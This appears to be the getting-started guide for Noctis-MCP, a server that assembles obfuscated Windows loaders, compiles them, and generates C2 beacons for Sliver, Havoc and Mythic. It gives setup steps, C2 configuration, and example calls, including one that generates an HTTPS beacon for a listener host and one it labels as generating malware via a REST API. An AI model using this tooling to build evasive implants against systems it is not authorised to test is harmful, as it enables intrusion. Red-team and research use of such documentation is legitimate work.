# Getting Started

Complete installation and configuration guide for Noctis-MCP.

## Prerequisites

### System Requirements

| Component | Requirement |
|-----------|-------------|
| Operating System | Windows 10/11 or Linux (Ubuntu 20.04+, Debian 11+, Kali) |
| Python | 3.11 or higher |
| RAM | 4GB minimum, 8GB recommended |
| Disk Space | 2GB free |
| Network | Internet connection for dependency installation |

### Compiler Requirements

**Windows:**
- Visual Studio Build Tools 2019 or later
- MSBuild in PATH

**Linux:**
- MinGW-w64 for Windows cross-compilation
- GCC 10.3 or later

## Installation

### Automated Setup (Linux)

```bash
# Clone repository
git clone https://github.com/Yenn503/Noctis-MCP.git
cd Noctis-MCP

# Run setup script
chmod +x setup.sh
./setup.sh

# Verify installation
python verify_setup.py
```

The setup script will:
1. Check Python version
2. Create virtual environment
3. Install dependencies
4. Detect and verify compilers
5. Run test suite
6. Verify all imports

### Manual Setup

**Step 1: Python Environment**

```bash
# Create virtual environment
python3 -m venv venv

# Activate virtual environment
source venv/bin/activate  # Linux/macOS
# venv\Scripts\activate   # Windows

# Verify Python version
python --version  # Should be 3.11+
```

**Step 2: Install Dependencies**

```bash
# Upgrade pip
pip install --upgrade pip

# Install requirements
pip install -r requirements.txt

# Verify installation
pip list | grep -E "flask|fastmcp|requests"
```

**Step 3: Install Compiler**

**Linux (MinGW):**
```bash
# Install MinGW-w64
sudo apt update
sudo apt install mingw-w64 -y

# Verify installation
x86_64-w64-mingw32-gcc --version  # Should show GCC version
i686-w64-mingw32-gcc --version     # Should show GCC version
```

**Windows (MSBuild):**
```powershell
# Download Visual Studio Build Tools
# https://visualstudio.microsoft.com/downloads/

# Or install via winget
winget install Microsoft.VisualStudio.2022.BuildTools

# Verify installation
where msbuild  # Should show path to MSBuild.exe
```

**Step 4: Verify Installation**

```bash
# Run verification script
python verify_setup.py
```

Expected output: **"Noctis-MCP is ready to use!"**

## Configuration

### Environment Variables

Create `.env` file in project root:

```bash
# Server Configuration
NOCTIS_HOST=127.0.0.1
NOCTIS_PORT=5000
NOCTIS_DEBUG=false

# Compilation Settings
MSBUILD_PATH="/path/to/MSBuild.exe"  # Windows only
TARGET_ARCH=x64
OPTIMIZATION=O2

# Output Directories
OUTPUT_DIR=compiled
CACHE_DIR=.cache

# Logging
LOG_LEVEL=INFO
LOG_FILE=noctis_server.log
```

### Server Configuration

Edit `config.yaml` for advanced settings:

```yaml
server:
  host: 127.0.0.1
  port: 5000
  debug: false
  workers: 4

compilation:
  timeout: 60  # seconds
  max_file_size: 10485760  # 10MB
  architectures:
    - x64
    - x86

obfuscation:
  default_string_encryption: aes
  default_api_hashing: djb2
  polymorphic: true

c2:
  sliver:
    enabled: true
    server_url: http://localhost:31337
  havoc:
    enabled: true
    server_url: http://localhost:40056
  mythic:
    enabled: true
    server_url: https://localhost:7443
    api_key: ""
```

## First Run

### Start the Server

```bash
# Activate virtual environment
source venv/bin/activate

# Start Flask server
python server/noctis_server.py
```

Expected output:
```
[2025-10-03 10:00:00] INFO: Starting Noctis-MCP Server
[2025-10-03 10:00:00] INFO: Platform: Linux
[2025-10-03 10:00:00] INFO: Compiler: MinGW-w64
[2025-10-03 10:00:00] INFO: Techniques loaded: 10
[2025-10-03 10:00:00] INFO: Server running on http://127.0.0.1:5000
```

### Verify Server

```bash
# Test server is running
curl http://localhost:5000/api/stats

# Expected response:
# {
#   "status": "online",
#   "techniques": 10,
#   "compilers": ["mingw"],
#   "c2_frameworks": ["sliver", "havoc", "mythic"]
# }
```

## Basic Usage

### Example 1: Generate Simple Loader

```python
from server.code_assembler import CodeAssembler

# Initialize assembler
assembler = CodeAssembler()

# Generate code
code = assembler.assemble([
    "NOCTIS-T124",  # API hashing
    "NOCTIS-T118"   # String encryption
])

print(code)
```

### Example 2: Compile Code

```python
from compilation import get_compiler

# Get compiler for current platform
compiler = get_compiler(output_dir='compiled')

# Compile code
result = compiler.compile(
    source_code=code,
    architecture='x64',
    optimization='O2',
    output_name='loader'
)

if result['success']:
    print(f"Binary: {result['binary_path']}")
    print(f"Size: {result['size']} bytes")
```

### Example 3: Generate C2 Beacon

```python
from c2_adapters import generate_sliver_beacon

# Generate Sliver HTTPS beacon
result = generate_sliver_beacon(
    listener_host="192.168.1.100",
    listener_port=443,
    protocol="https",
    techniques=["NOCTIS-T124"],
    obfuscate=True
)

print(f"Beacon: {result.beacon_path}")
print(f"OPSEC Score: {result.opsec_score}/10")
```

### Example 4: REST API

```bash
# Generate malware via REST API
curl -X POST http://localhost:5000/api/generate \
  -H "Content-Type: application/json" \
  -d '{
    "techniques": ["NOCTIS-T124", "NOCTIS-T118"],
    "target_os": "Windows 11",
    "obfuscate": true
  }'

# Compile code
curl -X POST http://localhost:5000/api/compile \
  -H "Content-Type: application/json" \
  -d '{
    "source_code": "...",
    "architecture": "x64",
    "optimization": "O2"
  }'
```

## Testing

### Run All Tests

```bash
# Run complete test suite
python -m pytest tests/ -v

# Expected: 186 tests, 100% pass rate
```

### Run Specific Tests

```bash
# Test compilation
python -m pytest tests/test_linux_compiler.py -v

# Test C2 integration
python -m pytest tests/test_sliver_integration.py -v

# Test code assembly
python -m pytest tests/test_c2_base.py -v
```

### Test Compilation Manually

```bash
# Test MinGW compilation
python test_mingw_simple.py
```

Expected output:
```
[*] Testing MinGW compilation...
[*] Compiling Windows PE...
[+] Compilation successful
[+] Binary: test_output.exe
[+] Size: 32768 bytes
```

## Troubleshooting

### Issue: ImportError for fastmcp

**Problem**: `ImportError: No module named 'fastmcp'`

**Solution**:
```bash
# Make sure virtual environment is activated
source venv/bin/activate

# Reinstall dependencies
pip install --upgrade -r requirements.txt

# Verify installation
python -c "import fastmcp; print('OK')"
```

### Issue: MinGW not found

**Problem**: `Compiler not found: x86_64-w64-mingw32-gcc`

**Solution**:
```bash
# Install MinGW-w64
sudo apt update
sudo apt install mingw-w64

# Verify installation
which x86_64-w64-mingw32-gcc
```

### Issue: MSBuild not found

**Problem**: `MSBuild.exe not found in PATH`

**Solution**:
```powershell
# Find MSBuild
where /R "C:\Program Files" MSBuild.exe

# Add to PATH or set environment variable
$env:MSBUILD_PATH="C:\Program Files\...\MSBuild.exe"
```

### Issue: Tests failing

**Problem**: Some tests fail during verification

**Solution**:
```bash
# Check Python version
python --version  # Must be 3.11+

# Reinstall dependencies
pip install --upgrade -r requirements.txt

# Run specific failing test with verbose output
python -m pytest tests/test_name.py -v --tb=long
```

### Issue: Server won't start

**Problem**: Port 5000 already in use

**Solution**:
```bash
# Kill process on port 5000
lsof -ti:5000 | xargs kill -9

# Or use different port
export NOCTIS_PORT=5001
python server/noctis_server.py
```

### Issue: Permission denied on setup.sh

**Problem**: `Permission denied: ./setup.sh`

**Solution**:
```bash
# Make executable
chmod +x setup.sh

# Run setup
./setup.sh
```

## Next Steps

After successful installation:

1. **Read [USER_GUIDE.md](USER_GUIDE.md)** - Learn how to use all features
2. **Read [C2_INTEGRATION.md](C2_INTEGRATION.md)** - Set up C2 frameworks
3. **Read [API_REFERENCE.md](API_REFERENCE.md)** - Complete API documentation
4. **Try Examples** - See `Examples/` directory for sample workflows

## Platform-Specific Notes

### Linux (Ubuntu/Debian/Kali)

**Advantages**:
- Faster compilation with MinGW (~1-2 seconds)
- Native package manager
- Better security isolation

**Setup**:
```bash
# Install all dependencies at once
sudo apt install python3.11 python3.11-venv mingw-w64 git -y

# Run automated setup
./setup.sh
```

### Windows

**Advantages**:
- Native MSBuild compilation
- Better debugging tools
- Visual Studio integration

**Setup**:
```powershell
# Install Visual Studio Build Tools
winget install Microsoft.VisualStudio.2022.BuildTools

# Install Python
winget install Python.Python.3.11

# Run manual setup
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt
```

### macOS

**Status**: Partial support

**Limitations**:
- No native Windows PE compilation
- Would need MinGW via Homebrew
- Not officially tested

**Setup** (experimental):
```bash
# Install Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install MinGW
brew install mingw-w64

# Follow Linux installation steps
```

---

**Last Updated**: October 3, 2025  
**Version**: 1.0.0

